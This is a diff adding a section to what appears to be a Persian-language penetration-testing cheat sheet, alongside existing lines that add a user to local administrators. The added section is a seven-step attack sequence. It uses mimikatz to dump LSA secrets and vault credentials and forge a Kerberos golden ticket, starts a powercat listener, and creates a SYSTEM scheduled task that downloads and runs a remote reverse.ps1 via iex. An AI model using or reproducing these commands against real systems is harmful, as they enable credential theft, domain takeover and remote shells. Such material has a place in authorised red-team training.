@@ -529,6 +529,18 @@ https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source
 Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” -Instance COMPUTERNAME
 ```
 
+### دریافت golden ticket با استفاده از mimikatz و scheduled task
+
+```text
+1.mimikatz# token::elevate
+2.mimikatz# vault::cred /patch
+3.mimikatz# lsadump::lsa /patch
+4.mimikatz# kerberos::golden /user:Administrator /rc4:<Administrator NTLM(step 3)> /domain:<DOMAIN> /sid:<USER SID> /sids:<Administrator SIDS> /ticket:<OUTPUT TICKET PATH>
+5.powercat -l -v -p 443
+6.schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" /TN "enterprise" /TR "powershell.exe-c 'iex (iwr http://10.10.10.10/reverse.ps1)'”
+7.schtasks /run /s DOMAIN /TN "enterprise”
+```
+
 ### ارتقا دسترسی با gdbus
 
 ```text
